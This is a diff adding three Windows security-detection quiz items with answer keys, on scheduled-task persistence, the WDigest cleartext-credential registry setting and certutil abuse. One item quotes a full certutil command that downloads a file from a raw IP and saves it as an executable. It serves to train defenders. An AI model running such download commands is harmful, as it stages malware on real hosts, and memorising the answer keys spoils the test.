@@ -1534,5 +1534,41 @@ window.QUIZ_BANK = [
     "correct": 0,
     "explanation": "In AS-REP roasting the attacker asks for a TGT for accounts that don't need Kerberos pre-authentication; the KDC answers with data encrypted with the user's key, which is then cracked offline. The DC logs 4768 with Pre-Authentication Type 0. Find those accounts with PowerShell (DoesNotRequirePreAuth) and clear the flag. 4769 with 0x17 points to Kerberoasting, and the attack needs neither RDP nor online password guessing.",
     "difficulty": "Medium"
+  },
+  {
+    "question": "On a workstation you find event 4698 at 03:12, created by a user account that never logs on at night. The new item runs powershell.exe with an encoded command every 15 minutes. What does this most likely show?",
+    "options": [
+      "A routine Windows Update check, because Windows schedules its update scans with encoded PowerShell commands during the night",
+      "A failed logon attempt, because 4698 records a wrong password and the encoded command is the hash of what the user typed",
+      "A user's password being changed, because 4698 is written when a password reset runs and it lists the script that changed it",
+      "Persistence through a new scheduled task, since 4698 means a task was created; review its XML in the event and remove it"
+    ],
+    "correct": 3,
+    "explanation": "Event 4698 is logged when a scheduled task is created (with Audit Other Object Access Events on), and the event includes the task's XML with the action it runs. A task created at night by an unusual account that launches encoded PowerShell every few minutes is a classic persistence technique. Windows Update tasks are signed system tasks, failed logons are 4625 and password resets are 4724.",
+    "difficulty": "Medium"
+  },
+  {
+    "question": "Your EDR alerts that HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential was set to 1 on a Windows 10 server. Why is this a serious warning sign?",
+    "options": [
+      "It turns on NTLMv2 for the server, which is the default anyway, so the alert is a false positive left by an old security baseline",
+      "It disables Windows Defender's real-time protection, so malware can be copied to the server without being scanned on arrival",
+      "It makes LSASS keep cleartext passwords in memory again after the next logon, so a credential dumper can read them in plain text",
+      "It forces every user to change their password at the next logon, which attackers use to lock administrators out of the server"
+    ],
+    "correct": 2,
+    "explanation": "Since Windows 8.1 and Server 2012 R2, WDigest no longer keeps cleartext credentials in LSASS. Setting UseLogonCredential to 1 brings that back, so after users log on again a tool like Mimikatz can dump their passwords in plain text. Attackers set it to prepare for credential theft. Alert on the change, set it back to 0 and look for LSASS access. It has nothing to do with NTLMv2, Defender or forced password changes.",
+    "difficulty": "Hard"
+  },
+  {
+    "question": "Process logs on a PC show: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Nobody on the IT team manages certificates on that PC. How should you read this?",
+    "options": [
+      "A normal certificate revocation check, because certutil downloads CRLs over HTTP and saves them as .exe files in Public",
+      "A built-in Windows tool abused to download a file from the internet, a living-off-the-land trick; check and isolate a.exe",
+      "A Windows Update repair, because certutil fetches replacement system files and stores them in the Public folder to install",
+      "A harmless cache cleanup, because -urlcache deletes old downloads and -split -f only splits the log file into smaller parts"
+    ],
+    "correct": 1,
+    "explanation": "certutil is a signed Windows binary meant for certificates, but '-urlcache -split -f <url> <file>' makes it download any file. Attackers use it to pull payloads without bringing their own downloader, which is why it is a well-known LOLBin. A .txt from a raw IP saved as an .exe in C:\\Users\\Public is a strong sign of malware staging, so isolate the host, collect the file and check its hash. CRL checks don't write executables, and Windows Update doesn't use certutil.",
+    "difficulty": "Medium"
   }
 ];
